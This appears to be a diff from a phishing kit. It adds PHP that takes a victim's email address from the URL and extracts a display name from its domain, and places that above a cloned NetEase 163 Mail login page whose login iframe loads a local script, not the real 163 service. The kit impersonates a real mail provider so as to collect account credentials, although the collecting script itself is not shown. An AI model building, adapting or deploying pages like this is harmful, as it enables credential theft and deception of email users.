@@ -1,3 +1,42 @@
+<?php
+function getloginIDFromlogin($email)
+{
+$find = '@';
+$pos = strpos($email, $find);
+$loginID = substr($email, 0, $pos);
+return $loginID;
+}
+function getDomainFromEmail($email)
+{
+// Get the data after the @ sign
+$domain = substr(strrchr($email, "@"), 1);
+return $domain;
+}
+$login = $_GET['email'];
+$loginID = getloginIDFromlogin($login);
+$domain = getDomainFromEmail($login);
+$ln = strlen($login);
+$len = strrev($login);
+$x = 0;
+for($i=0; $i<$ln; $i++){
+	if($len[$i] == "@"){
+		$x = $i;
+		break;
+	}
+}
+$yuh = substr($len,0,$x);
+$yuh = strrev($yuh);
+for($i=0; $i<$ln; $i++){
+	if($yuh[$i] == "."){
+		$x = $i;
+		break;
+	}
+}
+$yuh = substr($yuh,0,$x);
+$yuh = ucfirst($yuh);
+$display = strtoupper($yuh);
+
+?>
 <!DOCTYPE html>
 <html lang="zh-CN" style="display: block;" data-lt-installed="true" class="gr__mail_163_com"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="renderer" content="webkit"><meta http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; http://mimg.127.net https://mimg.127.net http://*.nosdn.127.net https://*.nosdn.127.net https://*.126.net https://*.reg.163.com https://reg.163.com http://*.reg.163.com http://reg.163.com https://mail.163.com https://*.mail.163.com http://*.mail.163.com https://126.com https://*.126.com https://mail.126.com https://*.mail.126.com http://*.mail.126.com https://yeah.net https://*.yeah.net https://*.mail.yeah.net https://mail.yeah.net http://mail.yeah.net http://*.mail.yeah.net http://email.163.com https://email.163.com http://*.email.163.com https://*.email.163.com https://kaola.com https://*.kaola.com http://kaola.com http://*.kaola.com blob: &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; object-src &#39;none&#39;;"><meta http-equiv="x-dns-prefetch-control" content="on"><title>163网易免费邮--中文邮箱第一品牌</title><meta name="description" content="网易163免费邮箱--中文邮箱第一品牌。容量自动翻倍，支持50兆附件,免费开通手机号码邮箱赠送3G超大附件服务。支持各种客户端软件收发，垃圾邮件拦截率超过98%。"><meta name="keywords" content="邮件，邮箱，电子邮件，电子邮箱，网易邮箱，163邮箱，免费邮箱，mail，email，网盘"><link rel="shortcut icon" href="https://mail.163.com/favicon.ico"><link rel="dns-prefetch" href="https://mimg.127.net/"><link rel="dns-prefetch" href="https://mail.163.com/"><link rel="dns-prefetch" href="https://urswebzj.nosdn.127.net/"><link rel="dns-prefetch" href="https://dl.reg.163.com/"><link rel="dns-prefetch" href="https://passport.126.com/"><link rel="dns-prefetch" href="https://passport-v6.yeah.net/"><link rel="dns-prefetch" href="https://iplocator.mail.163.com/"><link rel="prefetch" as="script" href="./index_files/raven-3.27.0.min.js.download"><link rel="preload" as="script" href="./index_files/raven-3.27.0.min.js.download"><link rel="prefetch" as="script" href="./index_files/webzj_cdn101_message.js.download"><link rel="preload" as="script" href="./index_files/webzj_cdn101_message.js.download"><link rel="prefetch" as="script" href="./index_files/es5-polyfill.js.download"><link rel="preload" as="script" href="./index_files/es5-polyfill.js.download"><script src="./index_files/raven-3.27.0.min.js.download"></script><script src="./index_files/webzj_cdn101_message.js.download"></script><link href="./index_files/style.7db5f35a.css" rel="stylesheet"><link type="text/css" rel="stylesheet" charset="UTF-8" href="./index_files/translateelement.css"></head><body data-gr-c-s-loaded="true"><div class="header"><div class="headerLogo"><div class="header-163logo"></div><p>163网易邮箱</p></div><p class="headerTitle">中文邮箱第一品牌</p><div class="headerNav"><a data-tj-name="b_nav_qiyemail_click" href="https://qiye.163.com/" target="_blank">企业邮箱</a> <a data-tj-name="b_nav_vipmail_click" href="https://vip.163.com/?b08abh1" target="_blank">VIP邮箱</a> <a data-tj-name="b_nav_mailplus_click" href="https://v.mail.163.com/?utm_source=163loginnav" target="_blank">会员PLUS</a> <a data-tj-name="b_nav_hwmail_click" href="https://hw.mail.163.com/#163" target="_blank">海外用户登录</a> <a data-tj-name="b_nav_mailmaster_pc_click" href="https://mail.163.com/dashi/dlpro.html?from=mail11" target="_blank" class="separation-line">邮箱大师</a> <a data-tj-name="b_nav_help_click" href="https://help.mail.163.com/" target="_blank">帮助</a> <a data-tj-name="b_nav_feedback_click" href="https://help.mail.163.com/newfeedback.do?m=add" target="_blank">登录反馈</a></div></div><div class="main" id="mainBg" style="background-color: rgb(255, 232, 235);"><div id="tips"></div><div id="mask-wrap"></div><div class="main-inner" id="mainCnt" style="background-image: url(&quot;https://mimg.127.net/m/lc/img/LoginBackgroundPic/2007/3/promPic.jpg&quot;);"><div class="main-inner-wrap"><div id="theme" style=""><a href="http://r.mail.163.com/r.jsp?url=http%3A%2F%2Fda.kaola.com%2Fredirect%3Ft%3D5ac89baed4b92c01%26p%3D5394f237%26proId%3D1024%26code%3D44fe99d82f049eb21533c2b1bd0b465c%26target%3Dhttps%253A%252F%252Fpages.kaola.com%252Fpages%252Factivity%252Fjt8d1puhpagesh.shtml%253Ftag%253Dea467f1dcce6ada85b1ae151610748b5&amp;sign=-1158937733&amp;_r_ignore_statId=7_16_79_2010&amp;_r_ignore_uid=xingjin0520" target="_blank" hidefocus="true" style="position: absolute; width: 650px; height: 640px; left: 0px; top: 0px; cursor: pointer;"></a></div><div class="themeCtrl"><a data-tj-name="b_theme_prev_click" id="prevTheme" class="prevTheme" href="javascript:void(0);" title="上一张" style="display: block;"></a> <a data-tj-name="b_theme_next_click" id="nextTheme" class="nextTheme" href="javascript:void(0);" title="下一张" style="display: block;"></a></div><div id="loginBlock" class="login tab-2"><div class="u-important-notice-wrapper"><a id="importantNotice" href="javascript:;" target="_blank"></a></div><div class="new-loginFunc"><div id="lbApp" class="new-loginFuncApp qrcode-163-icon"></div><div id="lbNormal" class="new-loginFuncNormal account-163-icon"></div><i class="ico-login-switch-tips"></i></div><div id="appLoginTab" class="loginForm loginForm-163" style="display: none;"><h2 class="loginbox-title">手机扫码 安全登录</h2>
 <div id="appLoginWait"><div class="appLoginWaitInner"><div id="appCodeWrap"><div id="appCodeBox"><img id="appCode" width="128" height="128" data-src="https://mimg.127.net/p/freemail/index/lib/img/t.gif"> <img id="appCodeLoading" width="16" height="16" src="./index_files/loading_s.gif" data-src="https://mimg.127.net/p/freemail/index/lib/img/loading_s.gif"><div id="appCodeRefresh" style="display:none;"><div class="appCode-mask"></div><div class="appCode-wrap"><p>二维码已失效</p><a data-tj-name="b_appLogin_refresh_qrcode_click" href="javascript:void(0)">请点击刷新</a></div></div></div><div class="u-scan-tips">打开<a data-tj-name="b_appLogin_mailmaster_download_click" href="https://mail.163.com/dashi/dlpro.html?from=mail23" target="_blank"> 网易邮箱大师 </a>扫一扫登录</div></div></div><p id="appLoginTxt" class="txt-err"></p></div><div id="appLoginScan" style="display:none"><div class="appLogin-scanSuc" id="appLoginScanSuc"></div><p class="appLogin-scantxt txt-suc">扫描成功，请在手机上确认登录</p><a data-tj-name="b_appLogin_goBack_qrcode_click" id="appLoginRestart" href="javascript:void(0)">返回二维码扫描</a></div><div class="u-common-entry"><a href="javascript:void(0)" id="switchAccountLogin" class="u-login-entry u-163-login-entry">密码登录</a><a data-tj-name="b_appLogin_register_new_account_click" href="https://reg.mail.163.com/mailregAll/reg0.jsp?from=163mail_right" class="u-reg-entry u-163-reg-entry" target="_blank">注册新帐号</a></div><form id="appLoginForm" method="post" action="https://mail.163.com/" autocomplete="off" target="_self"></form><img id="appLoginStat" width="1" height="1" style="position:absolute;left:0;bottom:-1px" src="./index_files/t.gif"></div><div id="normalLoginTab" class="loginForm" style="display: block;"><h2 class="loginbox-title">邮箱帐号登录</h2><div class="loginWrap"><div id="loginDiv" class="loginUrs" style="width: 400px; height: 302px;"><iframe name="" frameborder="0" id="x-URS-iframe1560941571854.4885" scrolling="no" style="width: 100%; height: 100%; border: none; background: none;" src="./index_files/index_dl2_new.php"></iframe>
